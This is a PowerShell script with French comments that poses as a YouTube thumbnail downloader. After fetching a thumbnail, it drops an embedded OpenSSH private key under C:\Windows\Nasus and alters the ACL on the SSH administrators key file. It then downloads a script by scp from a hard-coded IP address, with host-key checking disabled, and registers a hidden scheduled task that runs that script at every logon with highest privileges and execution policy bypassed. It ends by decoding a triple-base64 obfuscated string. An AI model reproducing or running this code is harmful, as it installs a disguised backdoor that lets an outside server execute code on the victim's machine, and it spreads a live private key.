
<#
dérouler du procédé:
    >>> get miniature
    >>> crée tache qui va chercher le script sur le serveur et celui-ci va dans C:\Windows\Nasus\MainScript.ps1
#>

########################################################################################################

Function Miniature 
{
    $VIDEO_ID = (Read-Host("Url De La Video")).Substring(32)
    $videoUrl = "https://i.ytimg.com/vi/$VIDEO_ID"

    try 
    {
        $thumbnailUrl = $videoUrl + "/maxresdefault.jpg"
        $response = Invoke-WebRequest -Uri $thumbnailUrl -UseBasicParsing -ErrorAction Stop
    }
    catch 
    {
        try 
        {
            $thumbnailUrl = $videoUrl + "/sddefault.jpg"
            $response = Invoke-WebRequest -Uri $thumbnailUrl -UseBasicParsing -ErrorAction Stop
        }
        catch 
        {
            try 
            {
                $thumbnailUrl = $videoUrl + "/hqdefault.jpg"
                $response = Invoke-WebRequest -Uri $thumbnailUrl -UseBasicParsing -ErrorAction Stop
            }
            catch 
            {
                try 
                {
                    $thumbnailUrl = $videoUrl + "/mqdefault.jpg"
                    $response = Invoke-WebRequest -Uri $thumbnailUrl -UseBasicParsing -ErrorAction Stop
                }
                catch 
                {
                    Write-Output ("$_")
                }
            }
        }
    }

    $jours = Get-Date -UFormat "%d-%m"
    $heure = Get-Date -UFormat "%HH%M-%Ss"
    $thumbnailPath = "$env:USERPROFILE\Desktop\Images\$jours\$heure.jpg"
    New-Item -Path $thumbnailPath -ItemType File -Force -InformationAction SilentlyContinue
    $response.Content | Set-Content $thumbnailPath -Encoding Byte -Force
}

Function configCleLog
{
$cle = '-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----'

    $pathCle = Test-Path -Path "$env:SystemRoot\Nasus\cle.pem"
    if(!$pathCle)
    {
        Write-Host("Creation de la cle car inexistante") -ForegroundColor DarkMagenta
        New-Item -ItemType Directory -Path $env:SystemRoot -Name "Nasus" -Force -InformationAction SilentlyContinue
        New-Item -ItemType File -Path $env:SystemRoot\Nasus -Name "cle.pem" -Value $cle -Force -InformationAction SilentlyContinue

        $directory = "C:\ProgramData\ssh\administrators_authorized_keys"
        $acl = Get-Acl $directory
        $acl.SetAccessRuleProtection($true,$false)
        #Droit Lecture Uniquement sur Administrateurs
        $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("gunsa","Read","Allow")
        $acl.SetAccessRule($AccessRule)
        $acl |Set-Acl
    } 
   
    #Pas de confirmation à la connexion
    ssh -o "StrictHostKeyChecking no" 13.39.106.145
}

Function getScriptOnServer
{
    scp -i "$env:SystemRoot/Nasus/cle.pem" admin@13.39.106.145:\home\admin\script\script.ps1 C:\Windows\Nasus\MainScript.ps1
    if(Test-Path -Path "C:\Windows\Nasus\MainScript.ps1"){Write-Host("Script Serveur Bien transfere") -ForegroundColor DarkMagenta}
}
###########################################||Tache pour executer script venant du serveur||#################################################################

function task
{
    if (!(Get-ScheduledTask -TaskName cc -ErrorAction SilentlyContinue))
    {
        Write-Host("Creation de la tache car inexistante") -ForegroundColor DarkMagenta
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument ("-ExecutionPolicy bypass -WindowStyle Hidden -File $env:SystemRoot\Nasus\MainScript.ps1")
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType ServiceAccount -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -Compatibility Win8 -ExecutionTimeLimit (New-TimeSpan -Days 90)
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal
        Register-ScheduledTask "cc" -InputObject $task -Force -InformationAction SilentlyContinue
        
    }
    Start-ScheduledTask -TaskName "cc"
}

Miniature
configCleLog
getScriptOnServer
task


$C = "WXpOT2IwbEhaREZpYms1b1VVUnJkMHhxUlhkUFV6UjVUWHByZFUxNlRXZE1Wa2xuVG1wWk1rNXFjSE5pTWs1b1lrZG9kbU16VVRaTmFrazk="

$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
$C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C))
$C

<#
for ($i = 0; $i -lt 3; $i++)
{
    $C = 
}
$C
#>